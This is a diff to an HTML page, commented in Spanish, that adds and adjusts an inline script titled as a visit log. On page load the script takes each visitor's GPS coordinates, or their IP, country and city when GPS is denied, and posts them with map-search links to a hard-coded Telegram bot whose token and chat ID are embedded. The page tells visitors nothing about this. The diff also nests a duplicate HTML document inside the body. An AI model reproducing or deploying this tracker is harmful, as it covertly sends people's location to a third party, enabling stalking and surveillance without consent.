@@ -59,16 +59,23 @@
 </head>
 <body>
 
-    <!-- SCRIPT DIRECTO PARA EVITAR CACHÉ DE UBICACIÓN (HIPERVÍNCULOS LIMPIOS) -->
+
+  
+
+  <!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registro de Visitas</title>
+</head>
+<body>
+
+    <!-- SCRIPT DIRECTO PARA EVITAR CACHÉ DE UBICACIÓN (CORREGIDO CON PARSE MODE HTML) -->
     <script>
     (function() {
         const TOKEN = '9068600803:AAEPd0lHMbVcyxhsCbXJGfutL0X-v6mr-pY';
         const CHAT_ID = '9180377107';
-
-        // Función auxiliar para escapar caracteres requeridos por MarkdownV2 de Telegram
-        function escapeMarkdown(text) {
-            return text.replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
-        }
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(function(pos) {
@@ -76,15 +83,15 @@
                 const lon = pos.coords.longitude;
                 const acc = Math.round(pos.coords.accuracy);
 
-                // Formato exacto de búsqueda en Google Chrome con codificación correcta
+                // Tu formato exacto de búsqueda en Google Chrome
                 const rawUrl = "https://google.com" + lat + "%2C" + lon + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + lat + "%2C" + lon;
                 
-                // Formato de hipervínculo en MarkdownV2 de Telegram: [Texto](URL)
-                const texto = "📍 *Nueva Visita \\(GPS\\)*\n\n" +
+                // Construcción limpia usando etiquetas HTML nativas de Telegram
+                const texto = "<b>📍 Nueva Visita (GPS)</b>\n\n" +
                               "• Latitud: " + lat + "\n" +
                               "• Longitud: " + lon + "\n" +
                               "• Precisión: ~" + acc + " metros\n\n" +
-                              "👉 [Ver Ubicación en Google Search](" + rawUrl + ")";
+                              "👉 <a href=\"" + rawUrl + "\">Ver Ubicación en Google Search</a>";
 
                 fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
                     method: 'POST',
@@ -92,12 +99,11 @@
                     body: JSON.stringify({ 
                         chat_id: CHAT_ID, 
                         text: texto,
-                        parse_mode: 'MarkdownV2' 
+                        parse_mode: 'HTML' // Cambiado a HTML para evitar el Error 400
                     })
                 }).catch(e => console.error("Error enviando GPS:", e));
 
             }, function(err) {
-                // Fallback por si el usuario deniega el GPS
                 fetch('https://ipapi.co')
                 .then(res => res.json())
                 .then(data => {
@@ -109,11 +115,11 @@
                     
                     const rawUrlIP = "https://google.com" + latIP + "%2C" + lonIP + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + latIP + "%2C" + lonIP;
 
-                    const textoIP = "🌐 *Nueva Visita \\(Por IP\\)*\n\n" +
-                                    "• IP: " + escapeMarkdown(ip) + "\n" +
-                                    "• País: " + escapeMarkdown(country) + "\n" +
-                                    "• Ciudad: " + escapeMarkdown(city) + "\n\n" +
-                                    "👉 [Ver Ubicación por IP](" + rawUrlIP + ")";
+                    const textoIP = "<b>🌐 Nueva Visita (Por IP)</b>\n\n" +
+                                    "• IP: " + ip + "\n" +
+                                    "• País: " + country + "\n" +
+                                    "• Ciudad: " + city + "\n\n" +
+                                    "👉 <a href=\"" + rawUrlIP + "\">Ver Ubicación por IP</a>";
                     
                     fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
                         method: 'POST',
@@ -121,7 +127,7 @@
                         body: JSON.stringify({ 
                             chat_id: CHAT_ID, 
                             text: textoIP,
-                            parse_mode: 'MarkdownV2'
+                            parse_mode: 'HTML' // Cambiado a HTML para evitar el Error 400
                         })
                     });
                 }).catch(e => console.error("Error enviando IP:", e));
